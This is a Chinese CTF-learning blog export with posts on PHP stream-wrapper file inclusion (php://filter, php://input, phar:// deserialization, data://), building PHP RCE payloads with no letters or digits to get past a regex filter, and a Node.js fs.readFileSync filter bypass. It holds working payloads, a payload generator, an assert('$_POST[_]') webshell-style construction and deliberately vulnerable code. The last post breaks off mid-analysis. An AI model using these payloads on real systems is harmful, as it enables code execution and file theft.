<p>php:// — 访问各个输入/输出流（I/O streams）</p>
<p>zlib:// – bzip2:// – zip:// — 压缩流</p>
<p>data:// — 数据（RFC 2397）</p>
<p>glob:// — 查找匹配的文件路径模式</p>
<p>phar:// — PHP 归档</p>
<p>ssh2:// — Secure Shell 2</p>
<p>rar:// — RAR</p>
<p>ogg:// — 音频流</p>
<p>expect:// — 处理交互式的流</p>
<p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p>
<p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p>
<h1><span id="厨房交响">厨房交响</span></h1><h2><span id="phpfilter-你吧来拿">php://filter — 你吧来拿</span></h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p>
<blockquote>
<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p>
<p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p>
</blockquote>
<p>常用参数概览</p>
<blockquote>
<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
<p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
</blockquote>
<p>常用过滤器</p>
<blockquote>
<p>convert.base64-encode &amp; convert.base64-decode</p>
<p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
</blockquote>
<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>此时index.php的同级目录下有个叫做test.txt的文件。</p>
<p>试图读取里面的信息</p>
<p><img src="/images/202112211700194.png"></p>
<p>不对啊，我明明往里面写了东西的呢</p>
<p>让我们用过滤器看看是怎么回事</p>
<p><img src="/images/202112211703524.png"></p>
<p>然后编回来</p>
<p><img src="/images/202112211711151.png"></p>
<p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p>
<h2><span id="phpinput-这是替身攻击">php://input — 这是替身攻击</span></h2><blockquote>
<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p>
</blockquote>
<p>那既然都提到POST了，能不带GET玩嘛~</p>
<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>试图搞事</p>
<p><img src="/images/202112211942039.png"></p>
<p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p>
<p><strong>替 身 觉 醒</strong></p>
<p><img src="/images/202112211952241.png"></p>
<p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p>
<p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p>
<p>某些情况下 绕过GET型传参的waf很好用。</p>
<p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p>
<h2><span id="file-让我访问你网站正不正常啊">file:// — 让我访问你网站正不正常啊</span></h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p>
<p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p>
<p><img src="/images/202112211522406.png"></p>
<p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p>
<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p>
<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure>

<p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p>
<p><img src="/images/202112212116212.png"></p>
<h2><span id="phar-有基佬开我裤链">phar:// — 有基佬开我裤链</span></h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p>
<p>在周大福里经常作为反序列化考点出现。</p>
<p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p>
<h3><span id="本地试吃">本地试吃</span></h3><p>我们先试着创建一个phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
<p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p>
<p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
<p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p>
<p><img src="/images/202112211610188.png"></p>
<p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/202112211623190.png"></p>
<p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p>
<p><strong>一种经典周大福</strong></p>
<p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p>
<h2><span id="data-皇军托我给您带个话">data:// — 皇军托我给您带个话</span></h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p>
<p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p>
<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure>
<p><img src="/images/202112212011428.png"></p>
<h2><span id="glob-我来了就是查寝来了">glob:// — 我来了就是查寝来了</span></h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码实现了一个简单的文件查看器的功能。</p>
<p><img src="/images/202112262150620.png"></p>
<p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p>
<p><img src="/images/202112262157376.png"></p>
]]></content>
      <tags>
        <tag>php-wrappers</tag>
      </tags>
  </entry>
  <entry>
    <title>无字母数字RCE初探</title>
    <url>/2022/03/28/rce_without_w_and_n/</url>
    <content><![CDATA[<p>没有blacklist的rce是没有灵魂的！</p>
<span id="more"></span>

<p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p>
<p>害羞羞，你看你就会开玩笑（指绕过</p>
<p>本地写个青春版</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>

<h1><span id="取反">取反</span></h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
<p>举个栗子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>

<p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p>
<p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p>
<p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p>
<p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p>
<p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure>

<p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p>
<p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p>
<p>让我们把这段代码再回下锅</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>

<p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p>
<p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p>
<p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="异或">异或</span></h1><p>万恶之源 我很异或（疑惑）的出处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>

<p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
<p>选择异或的理由？同或不行吗？当然可以!</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure>

<p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>

<p>（脚本绝赞升级中）</p>
<h1><span id="自增">自增</span></h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure>

<p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p>
<p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p>
<p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure>

<p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p>
<p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p>
<p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p>
<p><a href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p>
<p>真搞事还得是<code>system()</code>啊（确信</p>
<p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>
]]></content>
      <tags>
        <tag>php-rce</tag>
      </tags>
  </entry>
  <entry>
    <title>一个fs.readFileSync的trick浅析</title>
    <url>/2022/09/19/readFileSync/</url>
    <content><![CDATA[<p>一个<code>fs.readFileSync</code>的trick浅析</p>
<span id="more"></span>

<p>设想下面一个简单的代码片段：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">file</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>一个过滤了关键词<strong>flag</strong>的任意文件读取。</p>
<p>payload如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;file[href]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[origin]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[protocol]&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[pathname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;/fl%61g&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[hostname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>通过下面的源码分析，我们将得知这个trick的精彩之处。</p>
<p>首先从文档入手，粗略认识一下<code>fs.readFileSync</code>方法</p>
<p><img src="/images/20220923230858.png"></p>
<p>我们注意到<code>path</code>参数可以是一个<code>URL</code>对象，payload中的flag关键字似乎也是利用了url解码的方法进行绕过的。但显然我们无法直接输入一个<code>URL</code>对象，难道还有其它方法能构造出<code>URL</code>对象吗？</p>
<p><img src="/images/20220924233442.png"></p>
<p>顺着这个思路，我们开始一步步地跟进源码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readFileSync</span>(<span class="params">path, options</span>) &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">const</span> isUserFd = <span class="title function_">isFd</span>(path); <span class="comment">// 判断是否为文件描述符</span></span><br><span class="line">  <span class="keyword">const</span> fd = isUserFd ? path : fs.<span class="title function_">openSync</span>(path, options.<span class="property">flag</span>, <span class="number">0o666</span>);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>path</code>如果不是文件描述符的话，将调用<code>fs.openSync</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openSync</span>(<span class="params">path, flags, mode</span>) &#123;</span><br><span class="line">  path = <span class="title function_">getValidatedPath</span>(path);</span><br><span class="line">  <span class="keyword">const</span> flagsNumber = <span class="title function_">stringToFlags</span>(flags);</span><br><span class="line">  mode = <span class="title function_">parseFileMode</span>(mode, <span class="string">&#x27;mode&#x27;</span>, <span class="number">0o666</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctx = &#123; path &#125;;</span><br><span class="line">  <span class="keyword">const</span> result = binding.<span class="title function_">open</span>(pathModule.<span class="title function_">toNamespacedPath</span>(path),</span><br><span class="line">                              flagsNumber, mode,</span><br><span class="line">                              <span class="literal">undefined</span>, ctx);</span><br><span class="line">  <span class="title function_">handleErrorFromBinding</span>(ctx);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>getValidatedPath</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getValidatedPath = <span class="title function_">hideStackFrames</span>(<span class="function">(<span class="params">fileURLOrPath, propName = <span class="string">&#x27;path&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> path = <span class="title function_">toPathIfFileURL</span>(fileURLOrPath);</span><br><span class="line">  <span class="title function_">validatePath</span>(path, propName);</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>跟进回调函数中的<code>toPathIfFileURL</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toPathIfFileURL</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(fileURLOrPath))</span><br><span class="line">    <span class="keyword">return</span> fileURLOrPath;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fileURLToPath</span>(fileURLOrPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>isURLInstance</code>的真假判断</p>
